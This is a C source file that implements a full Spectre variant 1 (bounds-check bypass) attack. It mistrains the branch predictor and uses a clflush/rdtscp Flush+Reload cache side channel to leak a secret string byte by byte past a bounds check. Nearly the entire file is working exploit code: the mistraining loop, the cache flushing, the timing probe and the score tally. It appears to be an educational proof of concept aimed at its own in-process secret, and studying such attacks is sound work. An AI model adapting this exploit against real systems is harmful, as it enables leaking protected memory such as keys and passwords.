/*
 * full.c
 * Extension of the improved attack to steal entire secret string. 
 *
 * Kyle Dotterrer
 * December, 2018  
 */

#include <stdio.h>
#include <string.h>
#include <emmintrin.h>
#include <x86intrin.h>

/* ----------------------------------------------------------------------------
	Constants
*/

// number of attack iterations 
#define N_ATTACK_ITERS (1000)

// array access below cycles assumed to be cache hit  
#define CACHE_HIT_THRESHOLD (80)  

#define ARRSIZE (256)
#define DELTA   (1024)  // offset on each array access 

// just some arbitrary value for size of buffer to store the guess 
#define GUESS_BUFSIZE (512)

/* ----------------------------------------------------------------------------
	Local Protoypes 
*/
int  attack_full  (size_t target_addr);
void attack_local (size_t larger_x);

void flush_side_channel  (void);
void reload_side_channel (void);

uint8_t restricted_access(size_t x); 

/* ----------------------------------------------------------------------------
	Global Variables 
*/

unsigned int bufsize = 10;
uint8_t      buffer[10] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9};

uint8_t temp = 0;
char *secret = "some secret value";

uint8_t array[ARRSIZE*4096];

static int scores[ARRSIZE];

static char guess[GUESS_BUFSIZE]; 

/* ----------------------------------------------------------------------------
	Main 
*/

int main(void) {
	memset(guess, 0, GUESS_BUFSIZE); 

	int max_idx; 
	size_t target_addr; 
	size_t secret_len = strlen(secret);

	for (int i = 0; i < (int) secret_len; i++) {
		target_addr = (size_t) ((secret + i) - (char *)buffer);
		max_idx = attack_full(target_addr); 
		guess[i] = max_idx; 
	}

	printf("secret values are: \n");
	for (int i = 0; i < (int) secret_len; i++) {
		printf("%d ", guess[i]);
	}

	printf("\nsecret string is: \n");
	for (int i = 0; i < (int) secret_len; i++) {
		printf("%c", (char) guess[i]);
	}
	printf("\n");

	exit(0); 
}

/* ----------------------------------------------------------------------------
	Local Functions
*/

// perform many attack iterations on a single target address 
int attack_full(size_t target_addr) {
	flush_side_channel();

	for (int i = 0; i < ARRSIZE; i++) 
		scores[i] = 0;

	// run the attack over many iterations to reduce noise 
	for (int i = 0; i < N_ATTACK_ITERS; i++) {
		attack_local(target_addr);
		reload_side_channel(); 
	}

	// start indexing at 1
	// 0 will almost alway be the maximum value because of the way victim function is written
	// the cache line with arr[0] is always accessed, even at architectural level 
	int max_idx = 1; 
	for (int i = 1; i < ARRSIZE; i++) {
		if (scores[i] > scores[max_idx])
			max_idx = i;
	}

	return max_idx; 
}

// perform a single attack iteration 
void attack_local(size_t larger_x) {
	// mistrain the branch predictor 
	for (int i = 0; i < 10; i++) {
		restricted_access(i);
	}

	// flush the buffer size from cache 
	_mm_clflush(&bufsize);
	// flush the array from cache 
	for (int i = 0; i < ARRSIZE; i++) {
		_mm_clflush(&array[i*4096 + DELTA]);
	}

	// ask restricted access to return the secret via out of order exec 
	uint8_t s = restricted_access(larger_x);

	// use the secret to access the probe array 
	array[s*4096 + DELTA] += 88; 
}

void flush_side_channel(void) {
	// write to array to bring it to RAM
	// prevents copy on write 
	for (int i = 0; i < ARRSIZE; i++) 
		array[i*4096 + DELTA] = 1;

	// flush the entire array from cache 
	for (int i = 0; i < ARRSIZE; i++) 
		_mm_clflush(&array[i*4096 + DELTA]);
	
}

void reload_side_channel(void) {
	// where we store register contents
	// dont care about this 
	unsigned int junk = 0;

	register uint64_t time1, time2;
	volatile uint8_t *addr;

	for (int i = 0; i < ARRSIZE; i++) {
		addr = &array[i*4096 + DELTA];
		time1 = __rdtscp(&junk);
		junk = *addr; 
		time2 = __rdtscp(&junk) - time1;

		// large variable latency of access time due to caching 
		// allows us to determine (with high degree of certainty)
		// what the secret value used to access the array was 
		if (time2 <= CACHE_HIT_THRESHOLD) {
			// cache hit, increment the score for this possible secret value 
			scores[i]++;
		}
	}
}

// the new victim function 
uint8_t restricted_access(size_t x) {
	if (x < bufsize) {
		return buffer[x];
	} else {
		return 0;
	}
}
